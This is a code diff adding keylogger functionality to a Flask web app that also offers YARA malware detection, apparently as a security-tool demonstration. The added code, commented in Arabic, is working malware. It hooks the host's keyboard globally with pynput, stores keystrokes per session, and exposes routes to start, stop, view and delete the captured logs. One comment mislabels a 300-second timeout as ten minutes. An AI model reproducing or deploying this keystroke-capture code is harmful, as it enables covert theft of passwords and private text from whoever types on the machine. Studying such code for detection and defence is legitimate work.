@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, redirect
+from flask import Flask, render_template, request, jsonify, redirect, session
 import re
 import yara
 '''  '''
@@ -7,6 +7,11 @@ import os
 import mimetypes
 from zipfile import ZipFile
 from PyPDF2 import PdfReader
+'''  '''
+from pynput.keyboard import Listener
+import threading
+import time
+import uuid
 
 app = Flask(__name__)
 
@@ -465,6 +470,119 @@ def upload_file():
 @app.route('/yara-malware-detection')
 def yara_malware_detection():
     return render_template('yara-malware-detection.html')
+''' ------------------------------------------------------------------ '''
+''' ------------------------------------------------------------------ '''
+
+
+''' ------------------------------------------------------------------ '''
+''' ------------------------------------------------------------------ '''
+# مفتاح سري للجلسات
+app.secret_key = os.urandom(24)
+# قاموس لتخزين ضغطات المفاتيح لكل مستخدم
+keylogs_dict = {}
+# Listener عالمي
+listener = None
+
+# دالة لتسجيل ضغطات المفاتيح
+def write_to_file(key, user_id):
+    letter = str(key)
+    letter = letter.replace("'", "")
+
+    # استثناءات المفاتيح الخاصة
+    if letter == 'Key.space':
+        letter = ' '
+    if letter in ['Key.shift', 'Key.shift_r', 'Key.tab', 'Key.alt_l', 'Key.alt_gr', 
+                  'Key.ctrl_l', 'Key.ctrl_r', 'Key.caps_lock', 'Key.backspace', 
+                  'Key.home', 'Key.end', 'Key.insert', 'Key.delete', 'Key.esc', 
+                  'Key.print_screen']:
+        letter = ''
+    if letter == 'Key.enter':
+        letter = '\n'
+
+    # استثناءات المفاتيح الوظيفية
+    if letter.startswith("Key.f") or letter.startswith("Key.") and letter[4:] in ["right", "left", "up", "down"]:
+        letter = ""
+
+    # تخزين الضغطات في قاموس لكل مستخدم
+    if user_id not in keylogs_dict:
+        keylogs_dict[user_id] = {"logs": [], "last_active": time.time()}
+    keylogs_dict[user_id]["logs"].append(letter)
+    keylogs_dict[user_id]["last_active"] = time.time()
+
+# تشغيل الـ Keylogger في Thread منفصل
+def start_keylogger(user_id):
+    global listener
+    listener = Listener(on_press=lambda key: write_to_file(key, user_id))
+    listener.start()
+
+# إيقاف الـ Keylogger
+def stop_keylogger():
+    global listener
+    if listener:
+        listener.stop()
+        listener = None
+
+# حذف بيانات المستخدم بعد مرور وقت محدد
+def clear_inactive_users(timeout=300):  # 10 دقائق
+    while True:
+        current_time = time.time()
+        inactive_users = [
+            user_id for user_id, data in keylogs_dict.items()
+            if current_time - data["last_active"] > timeout
+        ]
+        for user_id in inactive_users:
+            del keylogs_dict[user_id]
+        time.sleep(60)
+
+# بدء تشغيل وظيفة الحذف التلقائي
+threading.Thread(target=clear_inactive_users, daemon=True).start()
+
+# بدء الـ Keylogger عند طلب HTTP
+@app.route('/start-keylogger', methods=['POST'])
+def start_keylogger_route():
+    try:
+        user_id = session.get('user_id')
+        if not user_id:
+            return jsonify({"error": "User ID not found in session"}), 400
+        start_keylogger(user_id)
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+# إيقاف الـ Keylogger عند طلب HTTP
+@app.route('/stop-keylogger', methods=['POST'])
+def stop_keylogger_route():
+    try:
+        stop_keylogger()
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+# عرض محتويات الـ Keylogs
+@app.route('/view-keylogs', methods=['GET'])
+def view_keylogs():
+    user_id = session.get('user_id')
+    if user_id in keylogs_dict:
+        keylogs = ''.join(keylogs_dict[user_id]["logs"])
+        return jsonify({"keylogs": keylogs})
+    else:
+        return jsonify({"keylogs": "No keylogs found."})
+
+# حذف بيانات المستخدم عند الطلب
+@app.route('/delete-keylogs', methods=['POST'])
+def delete_keylogs():
+    user_id = session.get('user_id')
+    if user_id in keylogs_dict:
+        del keylogs_dict[user_id]
+    return jsonify({"success": True, "message": "Keylogs deleted successfully."})
+
+# صفحة HTML للواجهة
+@app.route('/keylogger-malware')
+def keylogger_malware():
+    # إنشاء معرف مستخدم فريد لكل جلسة
+    if 'user_id' not in session:
+        session['user_id'] = str(uuid.uuid4())
+    return render_template('keylogger-malware.html')
 ''' ------------------------------------------------------------------ '''
 ''' ------------------------------------------------------------------ '''
 
